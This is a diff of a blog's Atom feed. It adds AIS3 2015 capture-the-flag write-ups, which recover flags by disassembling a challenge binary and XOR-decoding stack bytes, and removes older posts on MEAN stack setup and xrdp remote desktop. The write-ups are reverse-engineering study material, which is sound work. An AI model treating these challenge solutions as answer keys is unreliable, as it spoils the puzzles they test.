+&lt;p&gt;將 shellcode 輸出成 bin&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ echo -ne &quot;{ shellcode }&quot; &amp;gt; sc.bin
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;再丟到 ida 找到這個片段&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/0WraX3i.png&quot; alt=&quot;sc_shellcode_to_bin_in_ais3&#39;s_binary_question&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;總共有 40 個字元在堆疊中，藉由 [rsi+rdx] 逐一讀取 stack 中的字元並與 0CCh 做 xor，直到 dl 為 37 (25h)，也就是第 37 個字元為止&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# origin
+
+414141C6B1B9A3B5
+93BEA3AA93A8A0BC
+A1A5BF93BFA593A9
+A8A3AFA0A0A9A4BF
+93A7A3B7FF9F858D
+
+# after xor
+#[] : ignored
+
+[    ]0a7d756f79
+5f726f665f646c70
+6d69735f73695f65
+646f636c6c656873
+5f6b6f7b33534941
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Little Endian 系統，反向讀取並將 hex 轉為 ascii 就可以看到 flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/ohf0t1o.png&quot; alt=&quot;sc_converted_hex_to_ascii_in_ais3&#39;s_binary_question&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary2.html&quot;&gt;AIS3 2015 Writeup: binary2&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on July 27, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[AIS3 2015 Writeup: binary1]]></title>
+ <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary1.html" />
+  <id>//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary1</id>
+  <published>2015-07-27T12:00:00+08:00</published>
+  <updated>2015-07-27T12:00:00+08:00</updated>
+  <author>
+    <name>YU-KAI HUANG</name>
+    <uri>//joyhuang9473.github.io</uri>
+    <email>joyhuang@ags.tw</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;strings&quot;&gt;Strings&lt;/h2&gt;
+
+&lt;p&gt;Keynote:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;動態分析&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;ollyDbg201h&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;把 bin1.exe 丟到 ollydbg ，搜尋 string ‘AIS3’ 就可以找到 flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/nnfBQ1S.png&quot; alt=&quot;bin1_exe_strings_in_ais3&#39;s_binary_question&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;有稍微的漏字，但就依照 flag 上的語義自己填補了&lt;/p&gt;
+
+&lt;p&gt;p.s&lt;/p&gt;
+
+&lt;p&gt;ollyDbg110 的 strings 比 ollyDbg201h 較不完整&lt;/p&gt;
+
+&lt;p&gt;ollyDbg201h 的 strings 仍然會漏字，仍不清楚原因&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary1.html&quot;&gt;AIS3 2015 Writeup: binary1&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on July 27, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
   <title type="html"><![CDATA[Aslan-Rainbow-x]]></title>
  <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/project-general/project-game/2015/07/09/project-aslan-rainbow-x.html" />
   <id>//joyhuang9473.github.io/project-general/project-game/2015/07/09/project-aslan-rainbow-x</id>
@@ -382,377 +1075,6 @@
 &lt;p&gt;http://youtu.be/tG8F6BeAER8&lt;/p&gt;
 
     &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/2015/02/10/words.html&quot;&gt;思語&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on February 10, 2015.&lt;/p&gt;
-  </content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[NCU CSIE Website]]></title>
- <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/project-general/project-web/2015/02/04/project-ncucsie-website.html" />
-  <id>//joyhuang9473.github.io/project-general/project-web/2015/02/04/project-ncucsie-website</id>
-  <published>2015-02-04T12:00:00+08:00</published>
-  <updated>2015-02-04T12:00:00+08:00</updated>
-  <author>
-    <name>YU-KAI HUANG</name>
-    <uri>//joyhuang9473.github.io</uri>
-    <email>joyhuang@ags.tw</email>
-  </author>
-  <content type="html">
-    &lt;iframe class=&quot;imgur-album&quot; width=&quot;100%&quot; height=&quot;550&quot; frameborder=&quot;0&quot; src=&quot;//imgur.com/a/IDaQx/embed&quot;&gt;&lt;/iframe&gt;
-
-&lt;p&gt;URL: &lt;a href=&quot;http://www.csie.ncu.edu.tw&quot;&gt;http://www.csie.ncu.edu.tw&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;NCU-CSIE official website, written in LAMP.&lt;/p&gt;
-
-&lt;p&gt;Author: YU-KAI HUANG, Sheng-Han Yang, Hsing-Chien Cheng&lt;/p&gt;
-
-    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/project-general/project-web/2015/02/04/project-ncucsie-website.html&quot;&gt;NCU CSIE Website&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on February 04, 2015.&lt;/p&gt;
-  </content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[Google 模式 - How Google Works]]></title>
- <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/2015/01/23/google-mode-how-google-works.html" />
-  <id>//joyhuang9473.github.io/2015/01/23/google-mode-how-google-works</id>
-  <published>2015-01-23T15:22:00+08:00</published>
-  <updated>2015-01-23T15:22:00+08:00</updated>
-  <author>
-    <name>YU-KAI HUANG</name>
-    <uri>//joyhuang9473.github.io</uri>
-    <email>joyhuang@ags.tw</email>
-  </author>
-  <content type="html">
-    &lt;p&gt;Sega Cheng: CEO at LIVEhouse.in&lt;/p&gt;
-
-&lt;iframe src=&quot;//www.slideshare.net/slideshow/embed_code/43779604&quot; width=&quot;425&quot; height=&quot;355&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot; allowfullscreen=&quot;&quot;&gt; &lt;/iframe&gt;
-&lt;div style=&quot;margin-bottom:5px&quot;&gt; &lt;strong&gt; &lt;a href=&quot;//www.slideshare.net/segacheng/google-how-google-works&quot; title=&quot;Google 模式 - How Google Works&quot; target=&quot;_blank&quot;&gt;Google 模式 - How Google Works&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a href=&quot;//www.slideshare.net/segacheng&quot; target=&quot;_blank&quot;&gt;Sega Cheng&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;
-
-    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/2015/01/23/google-mode-how-google-works.html&quot;&gt;Google 模式 - How Google Works&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on January 23, 2015.&lt;/p&gt;
-  </content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[原來示波器可以這樣玩！]]></title>
- <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/2015/01/22/used-oscilloscope-can-be-so-fun.html" />
-  <id>//joyhuang9473.github.io/2015/01/22/used-oscilloscope-can-be-so-fun</id>
-  <published>2015-01-22T18:49:00+08:00</published>
-  <updated>2015-01-22T18:49:00+08:00</updated>
-  <author>
-    <name>YU-KAI HUANG</name>
-    <uri>//joyhuang9473.github.io</uri>
-    <email>joyhuang@ags.tw</email>
-  </author>
-  <content type="html">
-    &lt;p&gt;C1-65A - Bad Apple (HD)&lt;/p&gt;
-
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;//www.youtube.com/embed/7pzvEouWino&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/2015/01/22/used-oscilloscope-can-be-so-fun.html&quot;&gt;原來示波器可以這樣玩！&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on January 22, 2015.&lt;/p&gt;
-  </content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[「自動裝配」的機器人]]></title>
- <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/2015/01/18/air-fitting-mit-research-and-development-in-the-wind-and-the-water-autowiring-robot.html" />
-  <id>//joyhuang9473.github.io/2015/01/18/air-fitting-mit-research-and-development-in-the-wind-and-the-water-autowiring-robot</id>
-  <published>2015-01-18T02:58:00+08:00</published>
-  <updated>2015-01-18T02:58:00+08:00</updated>
-  <author>
-    <name>YU-KAI HUANG</name>
-    <uri>//joyhuang9473.github.io</uri>
-    <email>joyhuang@ags.tw</email>
-  </author>
-  <content type="html">
-    &lt;p&gt;&lt;a href=&quot;http://tw.leaderg.com/article/index?sn=10703&quot;&gt;LEADERG: 空中合體成形！MIT 研發能在風中、水中「自動裝配」的機器人&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Fluid Assembly: Chair Test&lt;/p&gt;
-
-&lt;iframe src=&quot;//player.vimeo.com/video/112761863?byline=0&amp;amp;portrait=0&quot; width=&quot;500&quot; height=&quot;281&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-&lt;p&gt;&lt;a href=&quot;http://vimeo.com/112761863&quot;&gt;Fluid Assembly: Chair Test&lt;/a&gt; from &lt;a href=&quot;http://vimeo.com/user1791262&quot;&gt;Self-Assembly Lab, MIT&lt;/a&gt; on &lt;a href=&quot;https://vimeo.com&quot;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Aerial Assemblies&lt;/p&gt;
-
-&lt;iframe src=&quot;//player.vimeo.com/video/109708208?byline=0&amp;amp;portrait=0&quot; width=&quot;500&quot; height=&quot;281&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-&lt;p&gt;&lt;a href=&quot;http://vimeo.com/109708208&quot;&gt;Aerial Assemblies&lt;/a&gt; from &lt;a href=&quot;http://vimeo.com/user1791262&quot;&gt;Self-Assembly Lab, MIT&lt;/a&gt; on &lt;a href=&quot;https://vimeo.com&quot;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;
-
-    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/2015/01/18/air-fitting-mit-research-and-development-in-the-wind-and-the-water-autowiring-robot.html&quot;&gt;「自動裝配」的機器人&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on January 18, 2015.&lt;/p&gt;
-  </content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[Change your words. Change your world.]]></title>
- <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/2015/01/03/change-your-words-change-your-world.html" />
-  <id>//joyhuang9473.github.io/2015/01/03/change-your-words-change-your-world</id>
-  <published>2015-01-03T07:01:00+08:00</published>
-  <updated>2015-01-03T07:01:00+08:00</updated>
-  <author>
-    <name>YU-KAI HUANG</name>
-    <uri>//joyhuang9473.github.io</uri>
-    <email>joyhuang@ags.tw</email>
-  </author>
-  <content type="html">
-    &lt;iframe marginwidth=&quot;0&quot; marginheight=&quot;0&quot; src=&quot;http://vlog.xuite.net/embed/dHR0S0Y5LTIxMDgzNzExLmZsdg==?ar=0&amp;amp;as=0&quot; width=&quot;640&quot; height=&quot;360&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/2015/01/03/change-your-words-change-your-world.html&quot;&gt;Change your words. Change your world.&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on January 03, 2015.&lt;/p&gt;
-  </content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[臺灣吧 Taiwan Bar]]></title>
- <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/2015/01/03/taiwan-taiwan-bar.html" />
-  <id>//joyhuang9473.github.io/2015/01/03/taiwan-taiwan-bar</id>
-  <published>2015-01-03T02:48:00+08:00</published>
-  <updated>2015-01-03T02:48:00+08:00</updated>
-  <author>
-    <name>YU-KAI HUANG</name>
-    <uri>//joyhuang9473.github.io</uri>
-    <email>joyhuang@ags.tw</email>
-  </author>
-  <content type="html">
-    &lt;p&gt;有幸在網路上發現這一個團體，這樣精巧的動畫影片僅由四個年輕人就能達成，或許 臺灣吧 官網上的觀點就能表達台灣現今年輕人的一種自我論述吧。&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我們四個人，是和平富足時代長大的幸運孩子，上一代的歷史包袱離我們很遠，或許正因為這樣，我們能用更寬闊的視野、更清明的心來處理歷史，思考我們的過去、當下與未來。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://taiwanbar.cc/&quot;&gt;臺灣吧 Taiwan Bar&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;臺灣吧 Taiwan Bar 第0集『賣台？後藤桑の如意算盤 淺談日治初期的「台灣賣卻論」』&lt;/p&gt;
-
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;//www.youtube.com/embed/eHTV_Xdrkp8&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/2015/01/03/taiwan-taiwan-bar.html&quot;&gt;臺灣吧 Taiwan Bar&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on January 03, 2015.&lt;/p&gt;
-  </content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[《Lumino City》]]></title>
- <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/2015/01/02/lumino-city.html" />
-  <id>//joyhuang9473.github.io/2015/01/02/lumino-city</id>
-  <published>2015-01-02T11:54:00+08:00</published>
-  <updated>2015-01-02T11:54:00+08:00</updated>
-  <author>
-    <name>YU-KAI HUANG</name>
-    <uri>//joyhuang9473.github.io</uri>
-    <email>joyhuang@ags.tw</email>
-  </author>
-  <content type="html">
-    &lt;p&gt;創作團隊 State of Play&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://www.biosmonthly.com/contactd.php?id=5479&quot;&gt;BIOS: 以紙打造的電玩世界&lt;/a&gt;
-&lt;a href=&quot;http://www.stateofplaygames.com/work/lumino-city/&quot;&gt;stateofplaygames: Lumino City&lt;/a&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;遊戲的主角是一位充滿冒險精神的少女，在城市裡尋找她走失的祖母，而玩家們將與少女一起探尋並解決遭遇的謎團。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;遊戲畫面的場景通通是由手工製作的紙板架疊起來的房屋，並掛起小小的發光 LED 燈飾作為城市場景裡的道具，接上電力後，遊戲人物和場景便能產生細緻的互動。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;iframe src=&quot;//player.vimeo.com/video/97832046&quot; width=&quot;500&quot; height=&quot;281&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-&lt;p&gt;&lt;a href=&quot;http://vimeo.com/97832046&quot;&gt;Lumino City - Official Trailer&lt;/a&gt; from &lt;a href=&quot;http://vimeo.com/user6948875&quot;&gt;State of Play&lt;/a&gt; on &lt;a href=&quot;https://vimeo.com&quot;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;
-
-    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/2015/01/02/lumino-city.html&quot;&gt;《Lumino City》&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on January 02, 2015.&lt;/p&gt;
-  </content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[初探 MEAN stack (一)]]></title>
- <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/2014/12/28/a-preliminary-study-on-meanjs-a.html" />
-  <id>//joyhuang9473.github.io/2014/12/28/a-preliminary-study-on-meanjs-a</id>
-  <published>2014-12-28T14:05:00+08:00</published>
-  <updated>2014-12-28T14:05:00+08:00</updated>
-  <author>
-    <name>YU-KAI HUANG</name>
-    <uri>//joyhuang9473.github.io</uri>
-    <email>joyhuang@ags.tw</email>
-  </author>
-  <content type="html">
-    &lt;p&gt;最近看到 &lt;a href=&quot;https://www.youtube.com/playlist?list=PL6rhBJX0L3TWYrwrQIi1_MzQDvVhkUVPI&quot;&gt;Bossable.com: 30 day MEAN STACK Honolulu CHALLENGE&lt;/a&gt; 教學視頻，想說就來了解一下什麼是 MEAN stack 吧，將來也會配合這視頻，記錄一下學習的歷程，希望能真的在 30 天以內學好 MEAN.js :)&lt;/p&gt;
-
-&lt;p&gt;首先先推這篇文章，寫得簡單易懂！&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://adon988.logdown.com/posts/247366-mean-stack-engineers-clean-title&quot;&gt;擁抱Javascript全端開發 - MEAN stack 工程師，你跟上了沒~&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;MEAN&lt;/strong&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;- MongoDB
-- Express
-- AngularJS
-- Node.js
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;Full stack&lt;/strong&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;對於Javascript前後端通吃的特性，可以稱做 “Javascript全端能力(full stack JavaScript)”或者”純Javascript解決方案(pure JavaScript solutions)”
-Full stack工程師&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;MEAN.JS: http://meanjs.org/docs.html
-bossable.com: http://www.bossable.com/&lt;/p&gt;
-
-&lt;p&gt;– clear –&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Getting started with the MEAN stack&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;nodejs&lt;/li&gt;
-  &lt;li&gt;mongoDB&lt;/li&gt;
-  &lt;li&gt;bower&lt;/li&gt;
-  &lt;li&gt;grunt&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;(nodejs的安裝不敘述了，而 mongoDB 的部分採用線上免費的 &lt;a href=&quot;https://mongolab.com&quot;&gt;mongolab&lt;/a&gt; ，大概有 500MB 空間可用)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$ npm install -g bower
-
-$ npm install -g grunt-cli
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;install-the-meanjs-generator&quot;&gt;Install the MEAN.JS generator&lt;/h2&gt;
-
-&lt;p&gt;另外還安裝了 Yo Generator ，將來會用它來取得最新的 MEAN.JS&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;The recommended way would be to use the official Yo Generator which will generate the latest stable copy of the MEAN.JS boilerplate and supply multiple sub-generators to ease your daily development cycles.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code&gt;$ npm install -g yo
-
-$ npm install -g generator-meanjs
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;create-your-mean-app&quot;&gt;Create your MEAN App&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code&gt;cd /path/to/project
-yo meanjs
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;set-up-database&quot;&gt;set up database&lt;/h2&gt;
-
-&lt;p&gt;這裡我改用 mongolab ，以下文中有簡單的使用教學：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://www.codedata.com.tw/database/mongodb-tutorial-1-setting-up-cloud-env/&quot;&gt;MongoDB Tutorial（1）雲端時代的 MongoDB 環境建置&lt;/a&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;# edit /path/to/project/config/env/development.js
-&#39;use strict&#39;;
-
-module.exports = {
-    db: &#39;mongodb://&amp;lt;dbuser&amp;gt;:&amp;lt;dbpassword&amp;gt;@something.mongolab.com:49130/mydatabase&#39;,
-    app: {
-            title: &#39;blog - Development Environment&#39;
-    },
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;start&quot;&gt;start&lt;/h1&gt;
-
-&lt;pre&gt;&lt;code&gt;$ grunt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;這樣就可以看到簡單的範例網頁了&lt;/p&gt;
-
-    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/2014/12/28/a-preliminary-study-on-meanjs-a.html&quot;&gt;初探 MEAN stack (一)&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on December 28, 2014.&lt;/p&gt;
-  </content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[墨華：橫軸探索解謎遊戲]]></title>
- <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/2014/12/28/mo-wa-horizontal-exploration-puzzle-game.html" />
-  <id>//joyhuang9473.github.io/2014/12/28/mo-wa-horizontal-exploration-puzzle-game</id>
-  <published>2014-12-28T09:40:00+08:00</published>
-  <updated>2014-12-28T09:40:00+08:00</updated>
-  <author>
-    <name>YU-KAI HUANG</name>
-    <uri>//joyhuang9473.github.io</uri>
-    <email>joyhuang@ags.tw</email>
-  </author>
-  <content type="html">
-    &lt;p&gt;偶然在網路上看到，聽說是大學生的畢業專題，感覺蠻精緻的，看到他人有如此的傑作，小弟心生慚愧啊&lt;/p&gt;
-
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;//www.youtube.com/embed/7YG59JPY-l4&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/2014/12/28/mo-wa-horizontal-exploration-puzzle-game.html&quot;&gt;墨華：橫軸探索解謎遊戲&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on December 28, 2014.&lt;/p&gt;
-  </content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[遠端 Ubuntu 14.04 桌面]]></title>
- <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/2014/12/27/remote-desktop-for-ubuntu-1404.html" />
-  <id>//joyhuang9473.github.io/2014/12/27/remote-desktop-for-ubuntu-1404</id>
-  <published>2014-12-27T03:18:00+08:00</published>
-  <updated>2014-12-27T03:18:00+08:00</updated>
-  <author>
-    <name>YU-KAI HUANG</name>
-    <uri>//joyhuang9473.github.io</uri>
-    <email>joyhuang@ags.tw</email>
-  </author>
-  <content type="html">
-    &lt;p&gt;最近因為期末專題的關係，選用了 Ubuntu 14.04 作為系統環境，而由於在下做的是跟影像辨識有關的題目，考量之後要秀出影像結果等需要，就來處理一下遠端桌面的功能，好讓我能帶著 MBP 去 demo :)&lt;/p&gt;
-
-&lt;p&gt;原本想說 ubuntu 這麼多人用，應該只要稍微設定一下就能用遠端桌面了吧，沒想到弄起來還是挺麻煩的 ==&lt;/p&gt;
-
-&lt;p&gt;首先還是先介紹可以正常運作的教學：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://c-nergy.be/blog/?p=5305&quot;&gt;Ubuntu 14.04 – How to install xrdp in Ubuntu 14.04&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;其實主要精神就是 &lt;strong&gt;安裝 xrdp ，改用 Xfce4&lt;/strong&gt; 作為桌面環境（desktop environment）&lt;/p&gt;
-
-&lt;p&gt;另外還有可能碰到的問題是，每當關閉遠端連線後，下次再遠端桌面登入卻是不同的 session ，就是重新遠端後看到的卻不是上一次遠端的桌面，那解決方法就是：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://askubuntu.com/questions/133343/how-do-i-set-up-xrdp-session-that-reuses-an-existing-session&quot;&gt;How do I set up xrdp session that reuses an existing session?&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Note:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;that only works if there’s already an existing session though. The first time in, there’s no session so it fails to connect to port 5912.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;似乎還不是一個很好的辦法，之後再找找囉。&lt;/p&gt;
-
-&lt;p&gt;– clear –&lt;/p&gt;
-
-&lt;p&gt;修改 /etc/xrdp/xrdp.ini&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;[xrdp1]
-name=sesman-vnc
-lib=libvnc.so
-username=ask
-password=ask
-ip=127.0.0.1
-port=5910 #原本的值為 -1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;至於為甚麼不能用 ubuntu 本身的 Unity 作為桌面環境，雖然還不確定原因，但感覺是 Unity, Gnome 對 xrdp 的支援程度有關，總之試過 gnome-session 的寫法，遠端後的結果都不樂觀，都會是 &lt;strong&gt;灰底畫面，還可以顯示的 ‘X’ 游標&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;（以下寫法都不能正常運作遠端桌面功能）&lt;/p&gt;
-
-&lt;p&gt;~/.xsession file :&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;# Uncomment one of list items below, if you really want to try and test
-
-#gnome-session --session=gnome-classic
-#gnome-session --session=gnome-fallback
-#gnome-session –-session=ubuntu-2d
-&lt;/code&gt;&lt;/pre&gt;
-
-    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/2014/12/27/remote-desktop-for-ubuntu-1404.html&quot;&gt;遠端 Ubuntu 14.04 桌面&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on December 27, 2014.&lt;/p&gt;
   </content>
 </entry>
 
